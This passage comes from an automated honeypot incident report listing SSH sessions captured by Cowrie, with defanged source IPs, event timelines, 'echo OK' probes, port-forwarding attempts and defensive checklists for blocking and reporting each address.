- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c9033599765

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-10 15:10 |
| **Last Seen** | 2026-07-10 15:10 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 15:10:22` | `cowrie.session.connect` |
| `2026-07-10 15:10:24` | `cowrie.client.version` |
| `2026-07-10 15:10:24` | `cowrie.client.kex` |
| `2026-07-10 15:10:31` | `cowrie.login.success` |
| `2026-07-10 15:10:35` | `cowrie.session.params` |
| `2026-07-10 15:10:35` | `cowrie.command.input` |
| `2026-07-10 15:10:37` | `cowrie.log.closed` |
| `2026-07-10 15:10:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2db10a003b2

| Field | Detail |
|---|---|
| **Source IP** | `200.232.114[.]71` |
| **First Seen** | 2026-07-10 15:15 |
| **Last Seen** | 2026-07-10 15:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 15:15:40` | `cowrie.session.connect` |
| `2026-07-10 15:15:40` | `cowrie.client.version` |
| `2026-07-10 15:15:40` | `cowrie.client.kex` |
| `2026-07-10 15:15:42` | `cowrie.login.success` |
| `2026-07-10 15:15:43` | `cowrie.direct-tcpip.request` |
| `2026-07-10 15:15:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.232.114[.]71` to AbuseIPDB if not already reported
- [ ] Block `200.232.114[.]71` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13edfe958cee

| Field | Detail |
|---|---|
| **Source IP** | `196.189.59[.]226` |
| **First Seen** | 2026-07-10 15:15 |
| **Last Seen** | 2026-07-10 15:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 15:15:48` | `cowrie.session.connect` |
| `2026-07-10 15:15:49` | `cowrie.client.version` |
| `2026-07-10 15:15:49` | `cowrie.client.kex` |
| `2026-07-10 15:15:51` | `cowrie.login.success` |
| `2026-07-10 15:15:51` | `cowrie.direct-tcpip.request` |
| `2026-07-10 15:15:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.59[.]226` to AbuseIPDB if not already reported
- [ ] Block `196.189.59[.]226` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94b1a603bfd7

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-10 15:16 |
| **Last Seen** | 2026-07-10 15:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 15:16:29` | `cowrie.session.connect` |
| `2026-07-10 15:16:29` | `cowrie.client.version` |
| `2026-07-10 15:16:29` | `cowrie.client.kex` |
| `2026-07-10 15:16:30` | `cowrie.login.success` |
| `2026-07-10 15:16:30` | `cowrie.direct-tcpip.request` |
| `2026-07-10 15:16:30` | `cowrie.direct-tcpip.data` |
| `2026-07-10 15:16:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7be3c3c03a03

| Field | Detail |
|---|---|
| **Source IP** | `59.23.20[.]15` |
| **First Seen** | 2026-07-10 15:18 |
| **Last Seen** | 2026-07-10 15:18 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 15:18:43` | `cowrie.session.connect` |
| `2026-07-10 15:18:44` | `cowrie.client.version` |
| `2026-07-10 15:18:44` | `cowrie.client.kex` |
| `2026-07-10 15:18:46` | `cowrie.login.success` |
| `2026-07-10 15:18:47` | `cowrie.direct-tcpip.request` |
| `2026-07-10 15:18:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.23.20[.]15` to AbuseIPDB if not already reported
- [ ] Block `59.23.20[.]15` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1fc96ae9cd1b

| Field | Detail |
|---|---|
| **Source IP** | `14.48.112[.]8` |
| **First Seen** | 2026-07-10 15:18 |
| **Last Seen** | 2026-07-10 15:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 15:18:53` | `cowrie.session.connect` |
| `2026-07-10 15:18:53` | `cowrie.client.version` |
| `2026-07-10 15:18:53` | `cowrie.client.kex` |
| `2026-07-10 15:18:55` | `cowrie.login.success` |
| `2026-07-10 15:18:56` | `cowrie.direct-tcpip.request` |
| `2026-07-10 15:19:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.48.112[.]8` to AbuseIPDB if not already reported
- [ ] Block `14.48.112[.]8` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b9598363ad5

| Field | Detail |
|---|---|
| **Source IP** | `187.115.144[.]103` |
| **First Seen** | 2026-07-10 15:22 |
| **Last Seen** | 2026-07-10 15:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 15:22:06` | `cowrie.session.connect` |
| `2026-07-10 15:22:07` | `cowrie.client.version` |
| `2026-07-10 15:22:07` | `cowrie.client.kex` |
| `2026-07-10 15:22:09` | `cowrie.login.success` |
| `2026-07-10 15:22:09` | `cowrie.direct-tcpip.request` |
| `2026-07-10 15:22:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.115.144[.]103` to AbuseIPDB if not already reported
- [ ] Block `187.115.144[.]103` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d23b1a794a19

| Field | Detail |
|---|---|
| **Source IP** | `182.79.218[.]101` |
| **First Seen** | 2026-07-10 15:22 |
| **Last Seen** | 2026-07-10 15:22 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 15:22:15` | `cowrie.session.connect` |
| `2026-07-10 15:22:16` | `cowrie.client.version` |
| `2026-07-10 15:22:16` | `cowrie.client.kex` |
| `2026-07-10 15:22:18` | `cowrie.login.success` |
| `2026-07-10 15:22:19` | `cowrie.direct-tcpip.request` |
| `2026-07-10 15:22:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.79.218[.]101` to AbuseIPDB if not already reported
- [ ] Block `182.79.218[.]101` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0569c123892

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-10 15:22 |
| **Last Seen** | 2026-07-10 15:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 15:22:36` | `cowrie.session.connect` |
| `2026-07-10 15:22:36` | `cowrie.client.version` |
| `2026-07-10 15:22:36` | `cowrie.client.kex` |
| `2026-07-10 15:22:37` | `cowrie.login.success` |
| `2026-07-10 15:22:37` | `cowrie.direct-tcpip.request` |
| `2026-07-10 15:22:37` | `cowrie.direct-tcpip.data` |
| `2026-07-10 15:22:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91a52a7570bc

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-10 15:22 |
| **Last Seen** | 2026-07-10 15:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 15:22:40` | `cowrie.session.connect` |
| `2026-07-10 15:22:42` | `cowrie.client.version` |
| `2026-07-10 15:22:42` | `cowrie.client.kex` |
| `2026-07-10 15:22:44` | `cowrie.login.success` |
| `2026-07-10 15:22:45` | `cowrie.session.params` |
| `2026-07-10 15:22:45` | `cowrie.command.input` |
| `2026-07-10 15:22:45` | `cowrie.log.closed` |
| `2026-07-10 15:22:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1aa4a2e82d93

| Field | Detail |
|---|---|
| **Source IP** | `121.189.198[.]60` |
| **First Seen** | 2026-07-10 15:23 |
| **Last Seen** | 2026-07-10 15:23 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 15:23:14` | `cowrie.session.connect` |
| `2026-07-10 15:23:15` | `cowrie.client.version` |
| `2026-07-10 15:23:15` | `cowrie.client.kex` |
| `2026-07-10 15:23:17` | `cowrie.login.success` |
| `2026-07-10 15:23:18` | `cowrie.direct-tcpip.request` |
| `2026-07-10 15:23:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.189.198[.]60` to AbuseIPDB if not already reported
- [ ] Block `121.189.198[.]60` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e50b5e7a16e

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]128` |
| **First Seen** | 2026-07-10 15:23 |
| **Last Seen** | 2026-07-10 15:23 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 15:23:23` | `cowrie.session.connect` |
| `2026-07-10 15:23:24` | `cowrie.client.version` |
| `2026-07-10 15:23:24` | `cowrie.client.kex` |
| `2026-07-10 15:23:25` | `cowrie.login.success` |
| `2026-07-10 15:23:25` | `cowrie.direct-tcpip.request` |
| `2026-07-10 15:23:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]128` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]128` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8eac34d684d1

| Field | Detail |
|---|---|
| **Source IP** | `65.20.204[.]88` |
| **First Seen** | 2026-07-10 15:24 |
| **Last Seen** | 2026-07-10 15:24 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 15:24:38` | `cowrie.session.connect` |
| `2026-07-10 15:24:39` | `cowrie.client.version` |
| `2026-07-10 15:24:39` | `cowrie.client.kex` |
| `2026-07-10 15:24:40` | `cowrie.login.success` |
| `2026-07-10 15:24:40` | `cowrie.direct-tcpip.request` |
| `2026-07-10 15:24:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.204[.]88` to AbuseIPDB if not already reported
- [ ] Block `65.20.204[.]88` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e715f4a23277

| Field | Detail |
|---|---|
| **Source IP** | `117.177.235[.]249` |
| **First Seen** | 2026-07-10 15:24 |
| **Last Seen** | 2026-07-10 15:24 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 15:24:46` | `cowrie.session.connect` |
| `2026-07-10 15:24:47` | `cowrie.client.version` |
| `2026-07-10 15:24:47` | `cowrie.client.kex` |
| `2026-07-10 15:24:51` | `cowrie.login.success` |
| `2026-07-10 15:24:52` | `cowrie.direct-tcpip.request` |
| `2026-07-10 15:24:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.177.235[.]249` to AbuseIPDB if not already reported
- [ ] Block `117.177.235[.]249` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5dfaed8b8c8f

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-10 15:25 |
| **Last Seen** | 2026-07-10 15:25 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 15:25:42` | `cowrie.session.connect` |
| `2026-07-10 15:25:44` | `cowrie.client.version` |
| `2026-07-10 15:25:44` | `cowrie.client.kex` |
| `2026-07-10 15:25:51` | `cowrie.login.success` |
| `2026-07-10 15:25:57` | `cowrie.session.params` |
| `2026-07-10 15:25:57` | `cowrie.command.input` |
| `2026-07-10 15:25:59` | `cowrie.log.closed` |
| `2026-07-10 15:25:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8ad013b5785

| Field | Detail |
|---|---|
| **Source IP** | `196.216.81[.]126` |
| **First Seen** | 2026-07-10 15:26 |
| **Last Seen** | 2026-07-10 15:26 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 15:26:35` | `cowrie.session.connect` |
| `2026-07-10 15:26:35` | `cowrie.client.version` |
| `2026-07-10 15:26:35` | `cowrie.client.kex` |
| `2026-07-10 15:26:37` | `cowrie.login.success` |
| `2026-07-10 15:26:38` | `cowrie.direct-tcpip.request` |
| `2026-07-10 15:26:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.216.81[.]126` to AbuseIPDB if not already reported
- [ ] Block `196.216.81[.]126` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7f70fa6b911

| Field | Detail |
|---|---|
| **Source IP** | `180.71.9[.]31` |
| **First Seen** | 2026-07-10 15:26 |
| **Last Seen** | 2026-07-10 15:26 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 15:26:47` | `cowrie.session.connect` |
| `2026-07-10 15:26:48` | `cowrie.client.version` |
| `2026-07-10 15:26:48` | `cowrie.client.kex` |
| `2026-07-10 15:26:50` | `cowrie.login.success` |
| `2026-07-10 15:26:51` | `cowrie.direct-tcpip.request` |
| `2026-07-10 15:26:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.71.9[.]31` to AbuseIPDB if not already reported
- [ ] Block `180.71.9[.]31` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8abf0a897972

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-10 15:27 |
| **Last Seen** | 2026-07-10 15:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 15:27:34` | `cowrie.session.connect` |
| `2026-07-10 15:27:34` | `cowrie.client.version` |
| `2026-07-10 15:27:34` | `cowrie.client.kex` |
| `2026-07-10 15:27:34` | `cowrie.login.success` |
| `2026-07-10 15:27:34` | `cowrie.direct-tcpip.request` |
| `2026-07-10 15:27:35` | `cowrie.direct-tcpip.data` |
| `2026-07-10 15:27:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7271cb96943

| Field | Detail |
|---|---|
| **Source IP** | `61.37.150[.]6` |
| **First Seen** | 2026-07-10 15:27 |
| **Last Seen** | 2026-07-10 15:28 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 15:27:58` | `cowrie.session.connect` |
| `2026-07-10 15:27:59` | `cowrie.client.version` |
| `2026-07-10 15:27:59` | `cowrie.client.kex` |
| `2026-07-10 15:28:01` | `cowrie.login.success` |
| `2026-07-10 15:28:02` | `cowrie.direct-tcpip.request` |
| `2026-07-10 15:28:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.37.150[.]6` to AbuseIPDB if not already reported
- [ ] Block `61.37.150[.]6` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c51f44761de

| Field | Detail |
|---|---|
| **Source IP** | `218.248.19[.]102` |
| **First Seen** | 2026-07-10 15:28 |
| **Last Seen** | 2026-07-10 15:28 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 15:28:13` | `cowrie.session.connect` |
| `2026-07-10 15:28:13` | `cowrie.client.version` |
| `2026-07-10 15:28:13` | `cowrie.client.kex` |
| `2026-07-10 15:28:15` | `cowrie.login.success` |
| `2026-07-10 15:28:16` | `cowrie.direct-tcpip.request` |
| `2026-07-10 15:28:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.248.19[.]102` to AbuseIPDB if not already reported
- [ ] Block `218.248.19[.]102` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0be89de877d4

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-10 15:37 |
| **Last Seen** | 2026-07-10 15:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 15:37:19` | `cowrie.session.connect` |
| `2026-07-10 15:37:19` | `cowrie.client.version` |
| `2026-07-10 15:37:19` | `cowrie.client.kex` |
| `2026-07-10 15:37:20` | `cowrie.login.success` |
| `2026-07-10 15:37:20` | `cowrie.direct-tcpip.request` |
| `2026-07-10 15:37:20` | `cowrie.direct-tcpip.data` |
| `2026-07-10 15:37:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ffd0ee6dfaa

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-10 15:40 |
| **Last Seen** | 2026-07-10 15:41 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 15:40:53` | `cowrie.session.connect` |
| `2026-07-10 15:40:55` | `cowrie.client.version` |
| `2026-07-10 15:40:55` | `cowrie.client.kex` |
| `2026-07-10 15:41:03` | `cowrie.login.success` |
| `2026-07-10 15:41:07` | `cowrie.session.params` |
| `2026-07-10 15:41:07` | `cowrie.command.input` |
| `2026-07-10 15:41:09` | `cowrie.log.closed` |
| `2026-07-10 15:41:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-993450194791

| Field | Detail |
|---|---|
| **Source IP** | `203.192.211[.]180` |
| **First Seen** | 2026-07-10 15:40 |
| **Last Seen** | 2026-07-10 15:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 15:40:55` | `cowrie.session.connect` |
| `2026-07-10 15:40:56` | `cowrie.client.version` |
| `2026-07-10 15:40:56` | `cowrie.client.kex` |
| `2026-07-10 15:40:58` | `cowrie.login.success` |
| `2026-07-10 15:40:58` | `cowrie.direct-tcpip.request` |
| `2026-07-10 15:41:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.192.211[.]180` to AbuseIPDB if not already reported
- [ ] Block `203.192.211[.]180` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-825235a3a64f

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-10 15:41 |
| **Last Seen** | 2026-07-10 15:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 15:41:51` | `cowrie.session.connect` |
| `2026-07-10 15:41:51` | `cowrie.client.version` |
| `2026-07-10 15:41:51` | `cowrie.client.kex` |
| `2026-07-10 15:41:51` | `cowrie.login.success` |
| `2026-07-10 15:41:53` | `cowrie.session.params` |
| `2026-07-10 15:41:53` | `cowrie.command.input` |
| `2026-07-10 15:41:54` | `cowrie.log.closed` |
| `2026-07-10 15:41:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fef436df0ea

| Field | Detail |
|---|---|
| **Source IP** | `85.152.57[.]60` |
| **First Seen** | 2026-07-10 15:44 |
| **Last Seen** | 2026-07-10 15:44 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 15:44:34` | `cowrie.session.connect` |
| `2026-07-10 15:44:35` | `cowrie.client.version` |
| `2026-07-10 15:44:35` | `cowrie.client.kex` |
| `2026-07-10 15:44:36` | `cowrie.login.success` |
| `2026-07-10 15:44:36` | `cowrie.direct-tcpip.request` |
| `2026-07-10 15:44:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.152.57[.]60` to AbuseIPDB if not already reported
- [ ] Block `85.152.57[.]60` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-902d6f2f8860

| Field | Detail |
|---|---|
| **Source IP** | `122.170.111[.]140` |
| **First Seen** | 2026-07-10 15:44 |
| **Last Seen** | 2026-07-10 15:44 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
